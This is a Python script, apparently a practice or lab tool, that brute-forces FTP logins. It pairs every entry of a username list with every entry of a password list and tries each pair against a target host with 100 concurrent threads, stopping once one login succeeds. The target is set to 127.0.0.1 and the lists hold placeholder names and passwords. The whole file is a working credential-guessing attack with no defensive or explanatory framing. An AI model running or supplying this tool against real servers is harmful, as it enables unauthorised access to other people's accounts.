from ftplib import FTP
import threading

valid_credentials_found = False
valid_credentials_found_lock = threading.Lock()  

def attempt_login(target, username, password):
    global valid_credentials_found

    with valid_credentials_found_lock:
        if valid_credentials_found:
            return

    try:
        ftp = FTP(target)
        ftp.login(user=username, passwd=password)
        with valid_credentials_found_lock:
            if not valid_credentials_found:  
                print(f"Success: {username}@{target} with password: {password}")
                valid_credentials_found = True
        return True
    except Exception as e:
        with valid_credentials_found_lock:
            if valid_credentials_found:  
                return
        print(f"Failed: {username}@{target} with password: {password} Error: {e}")
        return False

from concurrent.futures import ThreadPoolExecutor

def brute_ftp(target, username_list, password_list):
    print(f"Usernames in List: {len(username_list)} Passwords in List: {len(password_list)}")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        for username in username_list:
            for password in password_list:
                if valid_credentials_found:
                    break
                futures.append(executor.submit(attempt_login, target, username, password))
                
        for future in futures:
            future.result()

    print(f"Finished. {len(password_list) * len(username_list)} credentials have been tested.")
    if not valid_credentials_found:
        print("No valid credentials found.")

target = "127.0.0.1"
username_list = [
    "user1", "user2", "user3", "user105", "user106", "user107", "user108", "user109", "user110",
    "user111", "user112", "user113", "user114", "user115", "user116", "user117", "user118", "user119", "user120",
    "user121", "user122", "user123", "user124", "user125", "user126", "user127", "user128", "user129", "user130",
    "user131", "user132", "user133", "user134", "user135", "user136", "user137", "user138", "user139", "user140",
    "user141", "user142", "user143", "user144","test", "user145", "user146", "user147", "user148", "user149", "user150",
    # ...
    "user1000"
]

password_list = [
    "password1", "password2","password104", "password105", "password106", "password108", "password109", "password110",
    "password111", "password112", "password113", "password114", "password115", "password116", "password117", "password118", "password119", "password120",
    "password121", "password122", "password123", "password124", "password125", "password126", "password127", "password128", "password129", "password130",
    "password131", "password132", "password133", "password134", "password135", "password136", "password137", "password138", "password139", "password140",
    "password141", "password142", "password143","test","123", "password144", "password145", "password146", "password147", "password148", "password149", "password150",
    # ...
    "password1000"
]

brute_ftp(target, username_list, password_list)
